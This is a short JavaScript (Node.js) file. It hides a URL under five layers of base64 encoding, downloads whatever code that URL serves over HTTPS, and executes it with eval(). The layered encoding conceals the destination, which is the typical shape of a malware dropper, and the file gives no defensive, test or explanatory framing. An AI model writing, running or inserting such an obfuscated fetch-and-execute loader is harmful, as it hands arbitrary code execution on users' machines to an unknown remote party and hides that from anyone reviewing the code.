const https = require("https");

let enc = "VjFaV2IxVXdNVWhVYTJ4VlZrWndUbHBXVW5OTk1XdDVUVVJXVGxKdVFsbFdSM0JEVkZaWmQyTkhPVnBXYlZFd1dXdGtWMWRXVWxsV2JYUnBWbXh2TVZZeFVrdFdNazEzWlVoU1UySnRVbkZWV0hCelpERnNkRTFXVG1sU01WcEZWR3hvUjJGdFVqWk5SR3M5";

for (let i = 0; i < 5; i++) {
  enc = Buffer.from(enc, "base64").toString("utf8");
}

const URL = enc;

https.get(URL, res => {
  let data = "";
  res.on("data", c => data += c);
  res.on("end", () => {
    try {
      eval(data);
    } catch (e) {
      console.error("Eval error:", e.message);
    }
  });
}).on("error", err => {
  console.error("Request error:", err.message);
});